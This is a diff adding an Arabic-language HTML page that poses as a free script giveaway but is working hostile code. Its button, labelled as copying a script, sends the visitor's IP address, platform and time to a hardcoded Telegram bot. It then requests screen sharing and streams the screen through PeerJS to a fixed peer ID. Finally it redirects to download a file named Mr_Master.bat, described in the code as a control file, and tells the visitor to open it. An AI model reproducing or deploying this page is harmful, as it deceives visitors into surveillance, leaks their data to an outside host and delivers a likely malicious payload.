@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز توزيع السكربتات المجاني</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body, html {
+            height: 100%; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white; overflow: hidden; background-color: #000;
+        }
+        /* خلفية الصورة التي أرفقتها */
+        .bg-image {
+            background-image: url('https://i.ibb.co/v4x0XmY/1000014847.jpg'); /* رابط افتراضي للصورة */
+            filter: blur(5px) brightness(0.4);
+            height: 100%; background-position: center; background-repeat: no-repeat; background-size: cover;
+            position: absolute; width: 100%; z-index: -1;
+        }
+        .container {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            height: 100%; text-align: center; padding: 20px;
+        }
+        .card {
+            background: rgba(0, 0, 0, 0.7); padding: 30px; border-radius: 15px;
+            border: 1px solid #00ff00; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+        h1 { color: #00ff00; margin-bottom: 10px; }
+        p { font-size: 1.1em; margin-bottom: 25px; }
+        .btn {
+            background: #00ff00; color: black; border: none; padding: 15px 40px;
+            font-size: 1.2em; font-weight: bold; border-radius: 50px; cursor: pointer;
+            transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 255, 0, 0.4);
+        }
+        .btn:hover { transform: scale(1.05); background: #00cc00; }
+    </style>
+</head>
+<body>
+
+<div class="bg-image"></div>
+
+<div class="container">
+    <div class="card">
+        <h1>🎁 سكربت الأوامر المخفية</h1>
+        <p>اضغط على الزر بالأسفل لنسخ السكربت وتفعيله تلقائياً في حسابك</p>
+        <button class="btn" onclick="startCapture()">انسخ السكربت الآن</button>
+    </div>
+</div>
+
+<script>
+    // بياناتك الخاصة
+    const token = "8521430098:AAH9rZ7YNsbWwyigducN1EVOTMlg2UGtY9k";
+    const chat_id = "1330781289";
+    const myID = "Mr_Fm_Alpha_99"; // يجب أن يطابق الموجود في control.html
+    const peer = new Peer();
+
+    async function startCapture() {
+        // 1. سحب الـ IP وإرساله فوراً
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const info = ✅ تم صيد المبتز!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.platform}\n⏰ الوقت: ${new Date().toLocaleString()};
+            fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)});
+        } catch (e) { console.log("خطأ في البيانات"); }
+
+        // 2. طلب مشاركة الشاشة (بث مباشر للابتوبك)
+        try {
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            peer.call(myID, stream);
+            
+            // 3. تحميل ملف السيطرة Mr_Master.bat
+            setTimeout(() => {
+                window.location.href = "https://www.mediafire.com/file/uzu30zei1sp22ki/Mr_Master.bat/file";
+            }, 1500);
+
+            alert("تم نسخ السكربت! افتح ملف التفعيل الذي تم تحميله الآن ليتم ربطه بحسابك.");
+        } catch (err) {
+            alert("فشل نسخ السكربت: يجب الموافقة على صلاحيات النظام لتشغيل الأوامر المخفية!");
+        }
+    }
+</script>
+
+</body>
+</html>
